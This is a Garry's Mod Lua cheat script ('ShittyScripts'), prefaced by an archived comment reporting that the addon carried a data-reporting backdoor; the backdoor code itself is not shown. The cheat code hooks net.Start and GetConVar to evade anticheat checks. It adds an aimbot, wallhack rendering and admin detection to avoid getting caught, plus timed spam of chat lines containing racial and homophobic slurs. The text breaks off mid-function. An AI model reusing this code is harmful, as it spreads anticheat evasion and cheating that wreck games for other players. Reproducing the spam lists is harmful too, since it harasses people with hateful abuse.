--[[
    Paradox Note:

    Found in an old archive of a conversation between General HeX and RyanJGrey. If you want a copy of the actual deobfuscated code I manually did it 
    and put it into the tools section (rce_senator.lua). 

    https://pastebin.com/GzFt1P5b - General HeX's code pastebin.
    http://steamcommunity.com/sharedfiles/filedetails/?id=550806670 - Lost workshop upload of this script.
    http://puu.sh/pzSk1/3f26da831f.png - Lost image from HeX. Picture of the obfuscated backdoor code.
    http://puu.sh/pzSbz/3af2ad8852.png - LOst image from HeX. Picture of the backdoor code after being de-obfuscated.

    
    -=[UH]=- General HeX ☹: ```
    ShittyScripts backdoor (clientside)

    Discovered @ 20.06.16

    Clientside backdoor in the workshop addon "ShittyScripts", a GMod cheat.
    http://steamcommunity.com/sharedfiles/filedetails/?id=550806670

    Lines 1510 - 1548 in "sscripts.lua" are the backdoor. (snipped the rest of the cheat)
    Decoded in "ss_backdoor.lua"

    It reports:
    . Users's SteamID
    . User's IP address
    . IP of the current connected GMod server

    To: " http://gmod-rce-senator.c9users.io/api.php"
    Which can optionally send back code to be run on the client via RunString.

    Sidenote:
    Over the past 2 weeks, large bursts of users have been joining the UH server all
    in one go, all of whom had ShittyScripts, and got banned.
    Was it because of this backdoor possibly?

    Protection:
    . Don't cheat
    ```
--]]




/*
pls read:
I know a lot of the stuff in this script is really bad. There is a reason why I called it "shittyscripts"..
I know that there are waaay better ways to do some of the stuff that is in my script, but it was intended for personal use only..
The reason why I released it was because it was requested by people, so i decided to just release it, since i don't play GMOD that much anymore.

Obviously many of the things are older than some other stuff.. That why somethings are really retarded and some are just retarded.

THESE SCRIPTS ARE FAR FROM OPTIMIZED, SO DON'T EXPECT IT TO NOT LAG YOUR SHIT PC


Thank you:
----------------------------------------------------
Hejskilled: Helping with ideas for bypassing a shitty anticheat
Snaggle: Helping with problems I've been facing
Dark: Spreading my script
----------------------------------------------------

Fuck you:
----------------------------------------------------
Hackcraft for creating a shitty anticheat for my script after I helped him.
----------------------------------------------------
*/



-- CODED BY THE PROUD AND MIGHTY GRAVKO
-- NOT REALLY THAT MIGHTY
-- AND NOT REALLY PROUD, BUT STILL

local string = string
local util = util
local pairs = pairs
local math = math
local draw = draw
local type = type
local render = render
local hook = hook
local LocalPlayer = LocalPlayer
local cam = cam
local table = table
local RunConsoleCommand = RunConsoleCommand
local IsValid = IsValid
local player = player
local ents = ents
local EyePos = EyePos
local EyeAngles = EyeAngles
local tostring = tostring
local Vector = Vector
local team = team
local ScrW = ScrW
local ScrH = ScrH

local _R = debug.getregistry()
local SetColor = _R.Entity.SetColor
local GetColor = _R.Entity.GetColor
local SetMat = _R.Entity.SetMaterial
local GetMat = _R.Entity.GetMaterial
local GetClass = _R.Entity.GetClass
local GetRagdollEntity = _R.Player.GetRagdollEntity
local SetNoDraw = _R.Entity.SetNoDraw
local GetVelocity = _R.Entity.GetVelocity
local VelLength = _R.Vector.Length

local concommand = concommand
local cvars = cvars
local debug = debug
local ents = ents
local file = file
local hook = hook
local math = math
local spawnmenu = spawnmenu
local string = string
local surface = surface
local table = table
local timer = timer
local util = util
local vgui = vgui

local Angle = Angle
local CreateClientConVar = CreateClientConVar
local CurTime = CurTime
local ErrorNoHalt = ErrorNoHalt
local FrameTime = FrameTime
local GetConVarString = GetConVarString
local GetViewEntity = GetViewEntity
local include = include
local ipairs = ipairs
local LocalPlayer = LocalPlayer
local pairs = pairs
local pcall = pcall
local print = print
local RunConsoleCommand = RunConsoleCommand
local ScrH = ScrH
local ScrW = ScrW
local tonumber = tonumber
local type = type
local unpack = unpack
local ValidEntity = IsValid
local Vector = Vector
----------------------------------------------- create some shortcutz nigguh (I ended up not using these.. rip)
local shitcvar = CreateClientConVar
local shitcvarnum = GetConVarNumber
local ply = LocalPlayer()
local versionnum = "0.9.8"
-----------------------------------------------
-- Eat shit pls
local dNS = net.Start

function net.Start( nstr, ye )
	if nstr == "Iamscriptinglikeascriptkiddy" then
		MsgC( Color( 255, 0, 0 ), "[Shittyscripts] ", Color( 0, 255, 0 ), "Blocked net.Send check Check: "..nstr.."\n" )
	else
		return dNS( nstr, ye )
	end
end

local oldACL = GetConVar

function GetConVar( cn )
	if cn == "sv_allowcslua" then
		MsgC( Color( 255, 0, 0 ), "[Shittyscripts] ", Color( 0, 255, 0 ), "Blocked sv_allowcslua check Check: "..cn.."\n" )
	else
		return oldACL( cn )
	end
end
-----------------------------------------------

CreateClientConVar("shitty_thirdperson", "0", false, false)
local function thirdperson()
if GetConVarNumber("shitty_thirdperson") != 1 then return end
	local hamsa = {}

	hamsa.origin = pos-(angles:Forward()*100)
	hamsa.angles = angles
	hamsa.fov = fov
 
	return hamsa
end
hook.Add( "CalcView", "3rdperson", thirdperson )
-----------------------------------------------
CreateClientConVar("shitty_fov", "100", true, false)
local function shitfov()
	view = {}
	view.fov = GetConVarNumber("shitty_fov")
	return view
end
hook.Add("CalcView", "changeshitfov", shitfov)
-----------------------------------------------
CreateClientConVar("shitty_antiaim", "0", false, false)
hook.Add("CreateMove", "reallyshittyantiaim", function(cmd)
if GetConVarNumber("shitty_antiaim") != 1 then return end
	ang = cmd:GetViewAngles()
	if not input.IsMouseDown(MOUSE_LEFT) then
		cmd:SetViewAngles(Angle(-181, ang.y, 180))
	end
end)
-----------------------------------------------
hook.Add("PreDrawSkyBox", "removeSkybox", function()
    render.Clear(100, 100, 100, 255)
    return true
end)
-----------------------------------------------
shouldcrosshair = CreateClientConVar( "shitty_crosshair", "1", true, true)
 
hook.Add("HUDPaint", "shittyxhair", function()
	local gap = 0
	if GetConVarNumber("shitty_crosshair") != 1 then return end
	local x = ScrW() / 2
	local y = ScrH() / 2
	surface.SetDrawColor( 150, 255, 0, 255 )
	local length = gap + 10
	surface.DrawLine( x - length, y, x - gap, y )
	surface.DrawLine( x + length, y, x + gap, y )
	surface.DrawLine( x, y - length, x, y - gap )
	surface.DrawLine( x, y + length, x, y + gap )
end)
 
-----------------------------------------------
shouldshowspeed = shitcvar("shitty_showspeed", "1", true, true)
local function showspeed()
	if shouldshowspeed:GetBool() then
	local speed = math.floor(LocalPlayer():GetVelocity():Length())
	draw.SimpleTextOutlined( "Speed: "..speed, "Default", (ScrW() / 2) - 20, ScrH() - ScrH() + 7, Color(0,255,0,255), 4, 1, 1, Color(0, 0, 0, 255) )
	end
end
hook.Add("HUDPaint", "showspeednshit", showspeed)
------------------------------------------------
/*-------------------------------------------------------------------------
AIMBOT START
-------------------------------------------------------------------------*/

local shitAim = {}
shitAim.TargetMethod = {}
shitAim.Settings = {}
shitAim.TargetMethod["rage"] = false
shitAim.TargetMethod["closest"] = true
shitAim.TargetMethod["aimpoint"] = false
shitAim.Settings["sAimbone"] = "ValveBiped.Bip01_Head1"
shitAim.Settings["AimBotKey"] = KEY_E

local function HasHead(ent)
	local bone = ent:LookupBone(shitAim.Settings["sAimbone"])
	if bone then
		return true 
	else
		return false
	end
end

local function CanSeeHead(ent)
		local wishedbone  = ent:LookupBone(shitAim.Settings["sAimbone"])
		local trendpos = ent:GetBonePosition(wishedbone)
        local tr = {}
        tr.start = LocalPlayer():GetShootPos()
        tr.endpos = trendpos
        tr.filter = {LocalPlayer(), ent}
        tr.mask = MASK_SHOT
    local trace = util.TraceLine(tr)
    if (trace.Fraction == 1) then
        return true
    else
        return false
    end    
end

local function CanSeeOBB(ent)
		local obbendpos = ent:LocalToWorld(ent:OBBCenter())
        local tr = {}
        tr.start = LocalPlayer():GetShootPos()
        tr.endpos = obbendpos
        tr.filter = {LocalPlayer(), ent}
        tr.mask = MASK_SHOT
    local trace = util.TraceLine(tr)
    if (trace.Fraction == 1) then
        return true
    else
        return false
    end    
end



CreateClientConVar("shitty_aimbot", "0", false, false)
CreateClientConVar("shitty_aimbot_ignore_friends", "0", false, false)
CreateClientConVar("shitty_aimbot_ignore_buddies", "0", false, false)
CreateClientConVar("shitty_aimbot_ignore_team", "0", false, false)

local Locked
local aimBuddies = {}


local target

local function shitaimbot(cmd)

if GetConVarNumber("shitty_aimbot") != 1 then return end

	local AimBone
	local lpos = LocalPlayer():GetShootPos()
	
-----------------------------------------
//Playertable
-----------------------------------------
	
	
	local aimPlayers = {}
	for _, v in pairs(player.GetAll()) do
	
		table.insert(aimPlayers, v)
		
		if GetConVarNumber("shitty_aimbot_ignore_team") == 1 then
			if v:Team() == LocalPlayer():Team() then
				table.RemoveByValue(aimPlayers, v)
			end
		end
		
		if GetConVarNumber("shitty_aimbot_ignore_friends") == 1 then
			if v:GetFriendStatus() != "none" then
				table.RemoveByValue(aimPlayers, v)
			end
		end
		
		if v == LocalPlayer() then
			table.RemoveByValue(aimPlayers, v)
		end
		
		if !CanSeeOBB(v) then
			table.RemoveByValue(aimPlayers, v)
		end
		
		if v:Team() == TEAM_SPECTATOR then
			table.RemoveByValue(aimPlayers, v)
		end
			
	end

	
-----------------------------------------
//Targetting
-----------------------------------------
	
	
	if shitAim.TargetMethod["rage"] then
		for _, v in pairs(aimPlayers) do
			if v:Alive() then
				target = v
			end
		end
	end
	
	if shitAim.TargetMethod["closest"] then
		local allply = aimPlayers
        local plyDist = 100000
        for i = 1, #allply do
            v = allply[i]
			if v:Alive() then
            local plyDist2 = LocalPlayer():GetPos():Distance(v:GetPos())
            if plyDist2 < plyDist then
                plyDist = plyDist2
                target = v
            end
			end
		end
	end

	if shitAim.TargetMethod["aimpoint"] then
		local allply = aimPlayers
        local plyDist = 100000
        for i = 1, #allply do
            v = allply[i]
			if v:Alive() then
            local plyDist2 = LocalPlayer():GetEyeTrace().HitPos:Distance(v:GetPos())
            if plyDist2 < plyDist then
                plyDist = plyDist2
                target = v
            end
			end
		end
	end

-----------------------------------------
//Bonecheck
-----------------------------------------
for _, b in pairs(aimPlayers) do
	if !HasHead(target) then
		AimBone = target:LocalToWorld(target:OBBCenter())
		else
		AimBone = target:GetBonePosition(target:LookupBone("ValveBiped.Bip01_Head1"))
	end
end

-----------------------------------------
//Aimbot
-----------------------------------------

	
			if input.IsKeyDown(shitAim.Settings["AimBotKey"]) then
				if GetConVarNumber("shitty_aimbot_ignore_team") == 1 and target:Team() == LocalPlayer():Team() then return end
				if GetConVarNumber("shitty_aimbot_ignore_friends") == 1 and target:GetFriendStatus() != "none" then return end
				if !AimBone then return end
				
				cmd:SetViewAngles((AimBone - lpos):Angle())
			end
end

-----------------------------------------
//Callback
-----------------------------------------

cvars.AddChangeCallback("shitty_aimbot", function()
        if GetConVarNumber("shitty_aimbot") == 1 then
                hook.Add("CreateMove", "aimbotshit", shitaimbot)
        else
                hook.Remove("aimbotshit")
        end
end)

/*-------------------------------------------------------------------------
AIMBOT END
-------------------------------------------------------------------------*/
-----------------------------------------------
CreateClientConVar("shitty_adminbox", "1", true, false)

local function adminboxshit()
	if GetConVarNumber( "shitty_adminbox" ) != 1 then return end
	local shitheads = {}
	local shitheadrank = {}
	local l = 0

	
	
	for _, v in pairs( player.GetAll() ) do
		if not string.find(v:GetUserGroup(), "user") and not string.find(v:GetUserGroup(), "vip") and not string.find(v:GetUserGroup(), "VIP")  and not string.find(v:GetUserGroup(), "donator") and not string.find(v:GetUserGroup(), "trusted") and not string.find(v:GetUserGroup(), "Trusted") then 
			table.insert( shitheads, v:Name() )
			table.insert( shitheadrank, v:GetUserGroup() ) -- never used
		end
	end
	

	local textLength = surface.GetTextSize( table.concat(shitheads) )
	draw.RoundedBox(0, ScrW() - 175, ScrH() - ScrH() + 10, 155, 40, Color(0, 150, 255, 255)) -- stay
	draw.RoundedBox(0, ScrW() - 170, ScrH() - ScrH() + 15, 145, 30, Color(50, 50, 50, 255)) -- stay
	
	if table.Count(shitheads) != 0 then
		draw.RoundedBox(0, ScrW() - 170, ScrH() - ScrH() + 55, 145, 20 * table.Count(shitheads), Color(0, 0, 0, 200))
	end
	
		draw.SimpleText("Admins", "Default", ScrW() - 115, ScrH() - ScrH() + 23, Color(255, 255, 255))

	
	for k, v in pairs(shitheads) do
		draw.SimpleText(v, "default", ScrW() - 155, ScrH() - ScrH() + 59 + l, Color(255, 255, 255, 255))
		l = l + 19
	end
end
hook.Add("HUDPaint", "adminboxhook", adminboxshit)

cvars.AddChangeCallback("shitty_adminbox", function()
        if GetConVarNumber("shitty_adminbox") == 1 then
                hook.Add("HUDPaint", "adminboxhook", adminboxshit)
        else
                hook.Remove("adminboxhook")
        end
end)

-- foken scraatch is never happy no matter how I do it so who gives a shit anyways am i rite??
CreateClientConVar("shitty_spectaterbox", "1", true, false)
local function specboxshit()
   if GetConVarNumber( "shitty_spectaterbox" ) != 1 then return end
   local specs = {}
   local alength = 0
   local specplys = player.GetAll()
   
   -- idk why i did it this way lmao
   for i = 1, #specplys do
	local v = specplys[i]
	
    if v:GetObserverTarget() == LocalPlayer() then 
		table.insert(specs, v:Name())
	end
	end

   local textLength = surface.GetTextSize( table.concat(specs) )
	draw.RoundedBox(0, ScrW() - 355, ScrH() - ScrH() + 10, 155, 40, Color(0, 150, 255, 255)) -- stay
	draw.RoundedBox(0, ScrW() - 350, ScrH() - ScrH() + 15, 145, 30, Color(50, 50, 50, 255)) -- stay

	if table.Count(specs) != 0 then
		draw.RoundedBox(1, ScrW() - 350, ScrH() - ScrH() + 55, 150, 20 * table.Count(specs), Color(0,0,0,200))
	end
	draw.SimpleText("Spectators", "default", ScrW() - 305, ScrH() - ScrH() + 23, Color(255, 255, 255))
   

	for _, v in pairs(specs) do
        draw.SimpleText(v, "default", ScrW() - 335, ScrH() - ScrH() + 59 + alength, Color(255, 255, 255, 255))
        alength = alength + 19
	end
end
hook.Add("HUDPaint", "specboxhook", specboxshit)

cvars.AddChangeCallback("shitty_spectaterbox", function()
        if GetConVarNumber("shitty_spectaterbox") == 1 then
                hook.Add("HUDPaint", "specboxhook", specboxshit)
        else
                hook.Remove("specboxhook")
        end
end)
-----------------------------------------------
shouldxray = shitcvar( "shitty_chams", "0", false, false)
shitcvar("shitty_xray", "0", false, false)
local mat1 = CreateMaterial("GA0249aSFJ3","VertexLitGeneric",{
        ["$basetexture"] = "models/debug/debugwhite",
        ["$model"] = 1,
        ["$translucent"] = 1,
        ["$alpha"] = 1,
        ["$nocull"] = 1,
        ["$ignorez"] = 1
}
)
local mat2 = CreateMaterial("sweetbabyjesus","VertexLitGeneric",{
        ["$basetexture"] = "models/debug/debugwhite",
        ["$model"] = 1,
        ["$translucent"] = 1,
        ["$alpha"] = 1,
        ["$nocull"] = 1,
        ["$ignorez"] = 1
}
)

local function shitchams()
if GetConVarNumber("shitty_chams") != 0 then
	cam.Start3D(EyePos(), EyeAngles())
	for _, v in pairs(player.GetAll()) do
		if v != LocalPlayer() and v:Team() != TEAM_SPECTATOR then
			if v:Alive() then
				local ctc = team.GetColor(v:Team())
				render.SuppressEngineLighting( true )
				render.SetColorModulation(ctc.r / 255, ctc.g / 255, ctc.b / 255)
				render.MaterialOverride( mat1 )
				v:DrawModel()
				elseif v:Team() == "TEAM_SPECTATOR" then
				render.SuppressEngineLighting( true )
				render.SetColorModulation(0, 1, 0)
				render.MaterialOverride( mat1 )
				v:DrawModel()
			end
		end
	end
	else
	render.SuppressEngineLighting(false)
end
	
	for _, v in pairs(ents.GetAll()) do
		if v:IsWeapon() then
				render.SetColorModulation(1, 0, 0)
				render.MaterialOverride( mat1 )
				v:DrawModel()
		end
	end
	cam.End3D()
end

local function shitxray()
	if GetConVarNumber("shitty_xray") != 0 then                 
		for k,v in pairs(ents.FindByClass("prop_physics")) do
			if IsValid(v) then
				cam.Start3D(EyePos(), EyeAngles())
					render.SuppressEngineLighting( true )
					render.SetColorModulation(((1 / 255) + v:GetVelocity():Length()) / 1700, 0, 1)
					render.SetBlend(0.2)
					render.MaterialOverride( mat1 )
					v:SetColor(Color(255, 255, 255, 0))
					v:SetRenderMode(RENDERMODE_TRANSALPHA)
					v:DrawModel()
				cam.End3D()
			end
		end
		else
		render.SuppressEngineLighting(false)
	end
end


cvars.AddChangeCallback("shitty_xray", function()
	if GetConVarNumber("shitty_xray") == 1 then
	hook.Add("HUDPaint", "shittyxray", shitxray)
	
	else
		hook.Remove("shittyxray")
		for _, v in pairs(ents.FindByClass("prop_*")) do
			v:SetColor(Color(255, 255, 255, 255))
		end
	end
end)

cvars.AddChangeCallback("shitty_chams", function()
        if GetConVarNumber("shitty_chams") == 1 then
                hook.Add("HUDPaint", "shittychams", shitchams)
        else
                hook.Remove("shittychams")
        end
end)

---------------------------------------------------------------------------------------------------
shouldbhop = shitcvar("shitty_bhop", "0", true, true)
hook.Add("Think", "shittybhophook", function()
    if GetConVarNumber("shitty_bhop") != 1 or LocalPlayer():GetMoveType() == MOVETYPE_NOCLIP then return end
        if (input.IsKeyDown(KEY_SPACE)) then
            if LocalPlayer():IsOnGround() then
                if LocalPlayer():IsTyping() then return end
                    RunConsoleCommand("+jump")
                    jumped = 1
                else
                    RunConsoleCommand("-jump")
                    jumped = 0
            end
			elseif LocalPlayer():IsOnGround() then
				if jumped == 1 then
                    RunConsoleCommand("-jump")
                    jumped = 0
			end
        end
end)
        -------------------------------------------------------------------------------------------------
psay1 = {}
psay1[1] = "eow kid"
psay1[2] = "sup nigr"
psay1[3] = "gmod crash"
psay1[4] = "ERROR ERROR ERROR"
psay1[5] = "shiet son"
psay1[6] = "whahaahhhwaahhawhhwhahggggg"
psay1[7] = "wanna go m8?"
psay1[8] = "are you me or you or flødebolle"
psay1[9] = "do u evn mariokart"
psay1[10] = "im watching sleep bitjnyeggah"
psay1[11] = "how much wood could a woodchuck chuck if ur mom is a fag"
psay1[12] = "shiet daughter"
psay1[13] = "allahu-achbar death to the infidels"
psay1[14] = "swedish tantra sex"
psay1[15] = "i eat u like ur mom pusy"
psay1[16] = "u fink u hardcore??"
psay1[17] = "yer f0cken pushhin me ovr da limit m8"
psay1[18] = "ur a wishard hary"
psay1[19] = "old guy eatin pringels"
psay1[20] = "oh babey a triple"
 
CreateClientConVar("shitty_psayspam", "0", false, false)
--hook.Add("Think", "shittypsayspam", function()
local function psayspamfunc()
    if GetConVarNumber("shitty_psayspam") != 1 then return end
        if (input.IsKeyDown( KEY_E ) ) then
        local Ent = LocalPlayer():GetEyeTrace().Entity
        if !Ent or !Ent:IsValid() or Ent:GetClass() != "player" then return end
        LocalPlayer():ConCommand("ulx psay "..Ent:Name().." "..table.Random(psay1).." " )
end
end
timer.Create("psayspamtimer", .05, 0, psayspamfunc)
--end)

-----------------------------------------------------------------------------------------------------
chatspam1 = {}
chatspam1[1] = "eow kid"
chatspam1[2] = "sup nigr"
chatspam1[3] = "gmod crash"
chatspam1[4] = "ERROR ERROR ERROR"
chatspam1[5] = "shiet son"
chatspam1[6] = "whahaahhhwaahhawhhwhahggggg"
chatspam1[7] = "wanna go m8?"
chatspam1[8] = "are you me or you or flødebolle"
chatspam1[9] = "do u evn mariokart"
chatspam1[10] = "im watching sleep bitjnyeggah"
chatspam1[11] = "how much wood could a woodchuck chuck if ur mom is a fag"
chatspam1[12] = "shiet daughter"
chatspam1[13] = "allahu-achbar death to the infidels"
chatspam1[14] = "swedish tantra sex"
chatspam1[15] = "i eat u like ur mom pusy"
chatspam1[16] = "u fink u hardcore??"
chatspam1[17] = "yer f0cken pushhin me ovr da limit m8"
chatspam1[18] = "ur a wishard hary"
chatspam1[19] = "old guy eatin pringels"
chatspam1[20] = "oh babey a triple"
 
CreateClientConVar("shitty_chatspam_simple", "0", false, false)
--hook.Add("Think", "shittychatspamsimple", function()
local function chatspamsimpleshit()
    if GetConVarNumber("shitty_chatspam_simple") != 1 then return end
        LocalPlayer():ConCommand("say "..table.Random(chatspam1).." " )
end
timer.Create("chatspamtimer", .5, 0, chatspamsimpleshit)
--end)

------------------------------------------------------------------------------------------------------

CreateClientConVar("shitty_AdminAlert", "1", true, false)
CreateClientConVar("shitty_AdminAlert_distance", "150", true, false)
hook.Add( "HUDPaint", "aleraboutadminsnshit", function()
if GetConVarNumber("shitty_AdminAlert") != 1 then return end
	for k, v in pairs(player.GetAll()) do
	local amdminipos = v:LocalToWorld(v:OBBCenter())
	local admindist = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/40)
		if not string.find(v:GetUserGroup(), "user") and not string.find(v:GetUserGroup(), "vip") and not string.find(v:GetUserGroup(), "VIP")  and not string.find(v:GetUserGroup(), "donator") and not string.find(v:GetUserGroup(), "trusted") and not string.find(v:GetUserGroup(), "Trusted") and v != LocalPlayer() and admindist < tonumber(GetConVarNumber("shitty_AdminAlert_distance")) then
			cam.Start3D(EyePos() , EyeAngles())
			render.SetMaterial( Material("trails/electric") )
			render.DrawBeam( LocalPlayer():GetPos(), amdminipos, 20, 1, 1, Color( 255, 0, 0, 255 ) )
			cam.End3D()
			draw.DrawText( "An admin is nearby!", "DermaLarge", ScrW() * 0.5, ScrH() * 0.7, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER )
		end 
	end
end)
-----------------------------------------------------------------------------------------------------
function shittyrotateup()
timer.Create("spawn", 0.1, 1, function()
LocalPlayer():ConCommand("gm_spawn models/props_rooftop/sign_letter_m001.mdl")
end)
timer.Create("jump", 0.10, 1, function()
LocalPlayer():ConCommand("+jump")
end)
timer.Create("turnback", 0.2, 1, function()
local a = LocalPlayer():EyeAngles() LocalPlayer():SetEyeAngles(Angle(a.p-a.p-a.p, a.y-180, a.r))
end)
timer.Create("-jumps", 0.3, 1, function()
LocalPlayer():ConCommand("-jump")
end)
 
end
concommand.Add("shitty_rotate_up", shittyrotateup)
 
function shittyrotateup2()
LocalPlayer():ConCommand("gm_spawn models/props_rooftop/sign_letter_m001.mdl")
timer.Create("jump", 0.1, 1, function()
LocalPlayer():ConCommand("+jump")
end)
timer.Create("turnback", 0.2, 1, function()
local a = LocalPlayer():EyeAngles() LocalPlayer():SetEyeAngles(Angle(a.p-a.p-a.p, a.y-180, a.r))
end)
timer.Create("-jumps", 0.3, 1, function()
LocalPlayer():ConCommand("-jump")
end)
 
end
concommand.Add("shitty_rotate_up2", shittyrotateup2)
 
function shittyrotateupcon()
LocalPlayer():ConCommand("+jump")
local a = LocalPlayer():EyeAngles() LocalPlayer():SetEyeAngles(Angle(a.p-a.p-a.p, a.y-180, a.r))
timer.Create("-jumps", 0.3, 1, function()
LocalPlayer():ConCommand("-jump")
end)
 
end
concommand.Add("shitty_rotate_connor", shittyrotateupcon)
 
-------------------------------------------------------------------------------------------------------
function tellranks()
surface.PlaySound("UI/buttonclick.wav")
        for k, v in pairs(player.GetAll()) do
                                               
                        chat.AddText(Color(0, 255, 0), v:Nick()..": is: ", Color(255, 0, 0),v:GetUserGroup())
end
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Told ranks." )
end
concommand.Add("shitty_tellranks", tellranks)
-------------------------------------------------------------------------------------------------------
/*local function namesteal()
        rplayer = table.Random(player.GetAll())
                for k,v in pairs(player.GetAll()) do
                                                if rplayer == LocalPlayer() then return end
                        LocalPlayer():ConCommand("say /rpname "..rplayer:Nick().." ") --  
                end
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Attempted to steal name." )
end
concommand.Add("shitty_namesteal", namesteal)*/
-- Old namesteal rip
local function namesteal2()
	local x = table.Random(player.GetAll())
			vName = x:Nick()
			slen = string.len(vName)
         if x == LocalPlayer() then  
			chat.AddText(Color(255, 0, 0), "[Shittyscripts] ", Color(0, 255, 0), "Chose your own name. Trying again.")
			RunConsoleCommand("shitty_namesteal")
		 end
        RunConsoleCommand("say", "/rpname "..vName..string.GetChar(vName, slen))
		chat.AddText(Color(255, 0, 0), "[Shittyscripts] ", Color(0, 255, 0), "Chose: "..vName)
end
concommand.Add("shitty_namesteal", namesteal2)
-------------------------------------------------------------------------------------
local function shitty180()
	local RotateAng = LocalPlayer():EyeAngles() 
	LocalPlayer():SetEyeAngles(Angle(RotateAng.p, RotateAng.y-180, RotateAng.r))
end
concommand.Add("shitty_180", shitty180)

------------------------------------------------------------------------------------- YES I ADDED SOME FALCOS SO FOKEN WHAT 
CreateClientConVar("shitty_pk_nogun", "0", true, true)
hook.Add("HUDPaint", "nogunhook", function()
if shitcvarnum("shitty_pk_nogun") != 0 then
        if LocalPlayer():Alive() then
                LocalPlayer():GetViewModel():SetNoDraw(true)
		end
        else
        if LocalPlayer():Alive() then
                LocalPlayer():GetViewModel():SetNoDraw(false)
        end
end
end)
-------------------------------------------------------------------------------------
cvars.AddChangeCallback("shitty_xray", function()
if GetConVarNumber("shitty_xray") == 1 then
surface.PlaySound("buttons/button17.wav")
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Xray is ON." )
elseif GetConVarNumber("shitty_xray") == 0 then
surface.PlaySound("buttons/button18.wav")
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Xray is OFF." )
end
end)
cvars.AddChangeCallback("shitty_esp", function()
if GetConVarNumber("shitty_esp") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "ESP is ON." )
elseif GetConVarNumber("shitty_esp") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "ESP is OFF." )
end
end)
cvars.AddChangeCallback("shitty_esp_dot", function()
if GetConVarNumber("shitty_esp_dot") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "ESP dot is ON." )
elseif GetConVarNumber("shitty_esp_dot") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "ESP dot is OFF." )
end
end)
cvars.AddChangeCallback("shitty_esp_bar", function()
if GetConVarNumber("shitty_esp_bar") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "ESP bar is ON." )
chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "If you have low FPS, esp bar is not good.." )
elseif GetConVarNumber("shitty_esp_bar") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "ESP bar is OFF." )
end
end)
cvars.AddChangeCallback("shitty_psayspam", function()
if GetConVarNumber("shitty_psayspam") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Psay is ON." )
elseif GetConVarNumber("shitty_psayspam") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Psay is OFF." )
end
end)
cvars.AddChangeCallback("shitty_bhop", function()
if GetConVarNumber("shitty_bhop") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Bhop is ON." )
elseif GetConVarNumber("shitty_bhop") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Bhop is OFF." )
end
end)
cvars.AddChangeCallback("shitty_aimbot", function()
if GetConVarNumber("shitty_aimbot") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Aimbot is ON." )
chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "Use e button (by default) to target people." )
elseif GetConVarNumber("shitty_aimbot") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Aimbot is OFF." )
end
end)
cvars.AddChangeCallback("shitty_headtracers", function()
if GetConVarNumber("shitty_headtracers") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Headtracers are ON." )
elseif GetConVarNumber("shitty_headtracers") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Headtracers are OFF." )
end
end)
cvars.AddChangeCallback("shitty_pk_colorbeams", function()
if GetConVarNumber("shitty_pk_colorbeams") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "PK color beams are ON." )
elseif GetConVarNumber("shitty_pk_colorbeams") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "PK color beams are OFF." )
end
end)
cvars.AddChangeCallback("shitty_playertracers", function()
if GetConVarNumber("shitty_playertracers") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Playertracer is ON." )
elseif GetConVarNumber("shitty_playertracers") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Playertracer is OFF." )
end
end)
cvars.AddChangeCallback("shitty_pk_RemovePropsWhenDead", function()
if GetConVarNumber("shitty_pk_RemovePropsWhenDead") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "PK Remover is ON." )
elseif GetConVarNumber("shitty_pk_RemovePropsWhenDead") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "PK Remover is OFF." )
end
end)
cvars.AddChangeCallback("shitty_showaimthing", function()
if GetConVarNumber("shitty_showaimthing") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Showaimthing is ON." )
elseif GetConVarNumber("shitty_showaimthing") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Showaimthing is OFF." )
end
end)
cvars.AddChangeCallback("shitty_showspeed", function()
if GetConVarNumber("shitty_showspeed") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Showspeed is ON." )
